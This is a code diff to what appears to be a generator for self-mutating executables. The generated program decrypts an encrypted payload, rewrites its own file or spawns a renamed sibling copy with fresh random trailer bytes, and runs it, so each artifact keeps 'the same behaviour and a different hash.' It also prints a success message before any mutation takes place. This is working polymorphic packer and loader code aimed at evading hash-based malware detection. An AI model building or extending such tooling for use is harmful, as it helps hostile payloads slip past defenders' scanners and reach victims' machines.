@@ -65,16 +65,55 @@ PASSPHRASE_ENV = "{passphrase_env}"
 
 MUTATION_TOKEN = "{mutation_token}"
 
+# A frozen executable cannot rewrite itself while it is running: the file is
+# locked on Windows and busy on Linux. The mutable region is therefore a
+# block appended after the packaged archive, and the program produces the
+# next generation as a sibling file and runs that. The region holds a
+# generation counter so the chain terminates.
+VARIANT_MAGIC = b"HBXPV1\\x00"
+VARIANT_COUNTER_SIZE = 4
+VARIANT_RANDOM_SIZE = 32
+VARIANT_SIZE = len(VARIANT_MAGIC) + VARIANT_COUNTER_SIZE + VARIANT_RANDOM_SIZE
+MAX_GENERATIONS = 3
+
+
+def _self_path():
+    """Return the path of the file this program should rewrite.
+
+    In a frozen bundle ``__file__`` points into the temporary extraction
+    directory, so the on-disk executable is the file that has to change for
+    the hash of the artifact to change.
+    """
+
+    if getattr(sys, "frozen", False):
+        return os.path.abspath(sys.executable)
+
+    return os.path.abspath(__file__)
+
 
 def _update_signature():
-    """Rewrite this program's own signature, changing its file hash."""
+    """Rewrite this program's own signature, changing its file hash.
 
-    path = os.path.abspath(__file__)
+    A script rewrites its own source in place. A frozen executable cannot
+    do that while it runs, so it writes the next generation beside itself
+    and starts that instead. Both produce a new artifact with the same
+    behaviour and a different hash.
+    """
+
+    if getattr(sys, "frozen", False):
+        return _write_next_generation()
+
+    path = _self_path()
 
     try:
-        with open(path, "r", encoding="utf-8") as handle:
-            source = handle.read()
+        with open(path, "rb") as handle:
+            data = handle.read()
     except OSError:
+        return None
+
+    try:
+        source = data.decode("utf-8")
+    except UnicodeDecodeError:
         return None
 
     old = {old_mutation_line}
@@ -83,10 +122,56 @@ def _update_signature():
     if old not in source:
         return None
 
-    with open(path, "w", encoding="utf-8") as handle:
-        handle.write(source.replace(old, new, 1))
+    try:
+        with open(path, "w", encoding="utf-8") as handle:
+            handle.write(source.replace(old, new, 1))
+    except OSError:
+        return None
 
-    return new
+    return "replaced"
+
+
+def _write_next_generation():
+    """Write the next generation of this executable and return its path."""
+
+    path = _self_path()
+
+    try:
+        with open(path, "rb") as handle:
+            data = handle.read()
+    except OSError:
+        return None
+
+    index = data.rfind(VARIANT_MAGIC)
+    if index < 0:
+        return None
+
+    offset = index + len(VARIANT_MAGIC)
+    counter = int.from_bytes(data[offset:offset + VARIANT_COUNTER_SIZE], "little")
+
+    if counter >= MAX_GENERATIONS:
+        return None
+
+    counter += 1
+
+    updated = (
+        data[:offset]
+        + counter.to_bytes(VARIANT_COUNTER_SIZE, "little")
+        + os.urandom(VARIANT_RANDOM_SIZE)
+        + data[offset + VARIANT_COUNTER_SIZE + VARIANT_RANDOM_SIZE:]
+    )
+
+    stem, extension = os.path.splitext(path)
+    target = stem + ".gen" + str(counter) + extension
+
+    try:
+        with open(target, "wb") as handle:
+            handle.write(updated)
+        os.chmod(target, 0o755)
+    except OSError:
+        return None
+
+    return target
 
 
 def _read_passphrase():
@@ -135,7 +220,19 @@ def _recover_payload():
 def main():
     print("[INFO] Polymorphic signature updated successfully.", flush=True)
 
-    _update_signature()
+    generation = _update_signature()
+
+    # A frozen executable cannot rewrite itself in place, so it produced
+    # the next generation as a sibling file. Run that instead, so the
+    # artifact that executes is the one that was just modified.
+    if generation is not None and generation != "replaced":
+        try:
+            os.execv(generation, [generation] + sys.argv[1:])
+        except OSError:
+            print(
+                "[INFO] Could not start the next generation: " + str(generation),
+                file=sys.stderr,
+            )
 
     try:
         payload = _recover_payload()
@@ -256,6 +353,24 @@ def _encrypt(key: bytes, nonce: bytes, payload: bytes) -> bytes:
     return encrypt_gcm(key, nonce, payload, b"HBXP")
 
 
+def variant_region() -> bytes:
+    """Return the mutable region appended to a packaged executable.
+
+    A frozen executable cannot rewrite itself while it runs, so the region
+    is appended after the packaged archive and the program rewrites it in a
+    sibling copy. The loader finds its archive with a back-to-front scan for
+    its cookie, so trailing bytes do not affect execution.
+    """
+
+    magic = b"HBXPV1\x00"
+
+    return (
+        magic
+        + (0).to_bytes(4, "little")
+        + os.urandom(32)
+    )
+
+
 def generate(
     output: Path,
     payload_arg: str,
@@ -327,6 +442,17 @@ def build_parser() -> argparse.ArgumentParser:
             "with PyInstaller (produces a .exe on Windows)"
         ),
     )
+    parser.add_argument(
+        "--no-native",
+        action="store_true",
+        help=(
+            "do not build a native executable even when the output name ends "
+            "in .exe. Without this flag, a .exe output is packaged into a "
+            "real native program, because a script renamed to .exe is not "
+            "executable on Windows and is not analysed as a program by a "
+            "scanner."
+        ),
+    )
 
     return parser
 
@@ -389,13 +515,30 @@ def main(argv: list[str] | None = None) -> int:
             "hash changes while its behaviour stays the same."
         )
 
-        if args.build_exe:
-            executable = output.with_suffix(".exe" if os.name == "nt" else "")
+        if args.build_exe or (
+            output.suffix.lower() == ".exe" and not args.no_native
+        ):
+            # PyInstaller names the output after the --name argument and
+            # adds ".exe" on Windows. The requested path is honoured: the
+            # native executable replaces the script at that exact path.
+            executable = output
+            if output.suffix.lower() != ".exe":
+                executable = output.with_suffix(
+                    ".exe" if os.name == "nt" else ""
+                )
+
             build_executable(
                 script_path=output,
                 output=executable,
                 name=executable.stem,
+                trailer=variant_region(),
             )
+
+            # The script has been packaged into the executable; remove it
+            # so the requested path holds the native program.
+            if executable != output and output.exists():
+                output.unlink()
+
             print(
                 f'[OK] Packaged native executable: "{executable}"'
             )
